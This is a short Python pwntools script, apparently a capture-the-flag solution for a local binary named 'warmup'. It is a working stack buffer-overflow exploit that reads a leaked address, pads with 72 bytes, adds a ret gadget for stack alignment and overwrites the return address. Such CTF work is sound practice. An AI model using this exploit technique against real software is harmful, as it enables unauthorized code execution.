from pwn import *

context.log_level = "debug"

context.terminal = ["wezterm", "start", "--"]

p = process(b"./warmup")
e = ELF(b"./warmup")
r = ROP(e)
# gdb.attach(p, api=True)
ret_addr = r.find_gadget(["ret"]).address
info(f"ret_addr is: {ret_addr}")

p.recvline()
addr = int(p.recvline().split(b":")[1].strip(), 16)
info(f"addr is: {addr}")

payload = b"A" * 72
payload += p64(ret_addr)  # 16-byte align the stack
payload += p64(addr)

p.recvuntil(">")
p.sendline(payload)
p.recvline()
